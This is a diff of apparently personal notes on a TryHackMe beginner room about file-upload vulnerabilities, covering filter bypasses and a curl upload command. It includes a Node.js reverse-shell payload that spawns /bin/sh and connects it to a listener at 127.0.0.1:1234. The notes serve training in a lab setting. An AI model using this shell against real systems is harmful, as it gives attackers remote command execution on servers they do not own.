@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-10-09-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner
-
-**author:** Nathan Acks  
-**date:** 2021-10-09
-
 # Upload Vulnerabilities
 
 ## Bypassing Client-Side Filtering
@@ -32,7 +27,7 @@ Sending a file via curl is basically the same procedure as modify the file uploa
 
 ```
 curl -X POST -F "submit=$SUBMIT_VALUE" \
--F "${FILE_INPUT NAME}=@$PATH_TO_FILE" $URL
+             -F "${FILE_INPUT NAME}=@$PATH_TO_FILE" $URL
 ```
 
 ## Bypassing Server-Side Filtering: File Extensions
@@ -85,16 +80,16 @@ The server’s response when loading a page indicates that it is running Express
 
 ```
 (function(){
-var net = require("net"),
-cp = require("child_process"),
-sh = cp.spawn("/bin/sh", []);
-var client = new net.Socket();
-client.connect(1234, "127.0.0.1", function(){
-client.pipe(sh.stdin);
-sh.stdout.pipe(client);
-sh.stderr.pipe(client);
-});
-return /a/; // Prevents Node.js from crashing
+	var net = require("net"),
+	    cp = require("child_process"),
+	    sh = cp.spawn("/bin/sh", []);
+	var client = new net.Socket();
+	client.connect(1234, "127.0.0.1", function(){
+		client.pipe(sh.stdin);
+		sh.stdout.pipe(client);
+		sh.stderr.pipe(client);
+	});
+	return /a/; // Prevents Node.js from crashing
 })();
 ```
 
